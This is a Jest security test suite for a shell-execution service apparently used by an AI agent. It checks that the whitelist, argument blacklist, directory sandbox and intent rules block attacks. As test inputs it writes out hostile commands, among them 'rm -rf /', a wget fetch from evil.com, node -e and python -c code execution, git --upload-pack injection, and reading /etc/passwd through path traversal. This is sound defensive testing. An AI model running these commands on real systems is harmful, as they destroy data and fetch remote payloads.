/**
 * ShellTool Security Test Matrix
 *
 * These tests MUST ALL PASS before Sprint 2 is considered done.
 * Each test represents a real attack vector.
 *
 * Run: npx jest shell-security.test.ts
 */

import { ShellToolService, ShellSecurityError } from '../shell-bridge/src/node/shell-tool-service';

describe('ShellTool Security', () => {
  let service: ShellToolService;

  beforeEach(() => {
    service = new ShellToolService();
    service.setProjectRoot('/home/user/project');
  });

  // ─── Layer 1: Command Whitelist ────────────────────────

  describe('Command Whitelist', () => {
    test('BLOCK: sh (shell itself)', async () => {
      await expect(service.execute({
        command: 'sh', args: ['-c', 'echo pwned'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('COMMAND_BLOCKED');
    });

    test('BLOCK: bash', async () => {
      await expect(service.execute({
        command: 'bash', args: ['-c', 'echo pwned'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('COMMAND_BLOCKED');
    });

    test('BLOCK: rm', async () => {
      await expect(service.execute({
        command: 'rm', args: ['-rf', '/'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('COMMAND_BLOCKED');
    });

    test('BLOCK: wget', async () => {
      await expect(service.execute({
        command: 'wget', args: ['http://evil.com/payload'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('COMMAND_BLOCKED');
    });

    test('BLOCK: /bin/sh (path in command)', async () => {
      await expect(service.execute({
        command: '/bin/sh', args: ['-c', 'echo pwned'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('COMMAND_BLOCKED');
    });

    test('BLOCK: ./exploit.sh (relative path)', async () => {
      await expect(service.execute({
        command: './exploit.sh', args: [],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('COMMAND_BLOCKED');
    });

    test('ALLOW: flutter', async () => {
      // This would succeed if flutter is installed
      const permission = await service.canExecute('flutter', 'BUILD');
      expect(permission.allowed).toBe(true);
    });

    test('ALLOW: git', async () => {
      const permission = await service.canExecute('git', 'BUILD');
      expect(permission.allowed).toBe(true);
    });
  });

  // ─── Layer 2: Arg Blacklist ────────────────────────────

  describe('Arg Blacklist', () => {
    test('BLOCK: node -e (arbitrary code exec)', async () => {
      await expect(service.execute({
        command: 'node', args: ['-e', 'require("child_process").exec("rm -rf /")'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('ARG_BLOCKED');
    });

    test('BLOCK: python -c (arbitrary code exec)', async () => {
      await expect(service.execute({
        command: 'python3', args: ['-c', 'import os; os.system("rm -rf /")'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('ARG_BLOCKED');
    });

    test('BLOCK: node --eval', async () => {
      await expect(service.execute({
        command: 'node', args: ['--eval', 'process.exit(1)'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('ARG_BLOCKED');
    });

    test('BLOCK: git --upload-pack (RCE vector)', async () => {
      await expect(service.execute({
        command: 'git', args: ['--upload-pack', 'evil-command', 'clone', 'repo'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('ARG_BLOCKED');
    });
  });

  // ─── Layer 4: cwd Sandbox ──────────────────────────────

  describe('cwd Sandbox', () => {
    test('BLOCK: path traversal (../../../etc)', async () => {
      await expect(service.execute({
        command: 'cat', args: ['/etc/passwd'],
        cwd: '/home/user/project/../../../etc',
        intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('CWD_ESCAPE');
    });

    test('BLOCK: absolute path outside project', async () => {
      await expect(service.execute({
        command: 'ls', args: [],
        cwd: '/tmp/evil',
        intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('CWD_ESCAPE');
    });
  });

  // ─── Capability Matrix ─────────────────────────────────

  describe('Capability Matrix', () => {
    test('BLOCK: DESIGN intent cannot use shell', async () => {
      await expect(service.execute({
        command: 'flutter', args: ['test'],
        cwd: '/home/user/project', intent: 'DESIGN', turnId: 't-001',
      })).rejects.toThrow('CAPABILITY_DENIED');
    });

    test('BLOCK: CONVERSATIONAL intent cannot use shell', async () => {
      await expect(service.execute({
        command: 'ls', args: [],
        cwd: '/home/user/project', intent: 'CONVERSATIONAL', turnId: 't-001',
      })).rejects.toThrow('CAPABILITY_DENIED');
    });

    test('BLOCK: REVIEW cannot run write commands', async () => {
      await expect(service.execute({
        command: 'mkdir', args: ['new-dir'],
        cwd: '/home/user/project', intent: 'REVIEW', turnId: 't-001',
      })).rejects.toThrow('READONLY_DENIED');
    });

    test('BLOCK: REVIEW cannot git commit', async () => {
      await expect(service.execute({
        command: 'git', args: ['commit', '-m', 'hack'],
        cwd: '/home/user/project', intent: 'REVIEW', turnId: 't-001',
      })).rejects.toThrow('READONLY_DENIED');
    });

    test('ALLOW: REVIEW can run tests', async () => {
      const permission = await service.canExecute('jest', 'REVIEW');
      expect(permission.allowed).toBe(true);
      expect(permission.readOnly).toBe(true);
    });

    test('ALLOW: REVIEW can git diff', async () => {
      const permission = await service.canExecute('git', 'REVIEW');
      expect(permission.allowed).toBe(true);
    });
  });

  // ─── npm/yarn Invariant ────────────────────────────────

  describe('npm/yarn Invariant', () => {
    test('npm install gets --ignore-scripts injected', async () => {
      // We can't easily test the actual spawn, but we test canExecute
      // and that the sanitizeNpmArgs logic works
      const permission = await service.canExecute('npm', 'BUILD');
      expect(permission.allowed).toBe(true);
      // The --ignore-scripts injection happens inside execute()
    });

    test('BLOCK: npm run without user confirmation', async () => {
      // No confirmation handler set → deny by default
      await expect(service.execute({
        command: 'npm', args: ['run', 'build'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('USER_DENIED');
    });

    test('BLOCK: npm test without user confirmation', async () => {
      await expect(service.execute({
        command: 'npm', args: ['test'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('USER_DENIED');
    });
  });

  // ─── Combined Attack Vectors ───────────────────────────

  describe('Combined Attacks', () => {
    test('BLOCK: Whitelisted command + code exec arg', async () => {
      // node is whitelisted, but -e is blocked
      await expect(service.execute({
        command: 'node', args: ['-e', 'process.exit()'],
        cwd: '/home/user/project', intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('ARG_BLOCKED');
    });

    test('BLOCK: Valid command + cwd escape', async () => {
      await expect(service.execute({
        command: 'cat', args: ['passwords.txt'],
        cwd: '/etc',
        intent: 'BUILD', turnId: 't-001',
      })).rejects.toThrow('CWD_ESCAPE');
    });

    test('BLOCK: Valid command + wrong intent', async () => {
      await expect(service.execute({
        command: 'flutter', args: ['build', 'apk'],
        cwd: '/home/user/project', intent: 'SEARCH', turnId: 't-001',
      })).rejects.toThrow('CAPABILITY_DENIED');
    });
  });
});
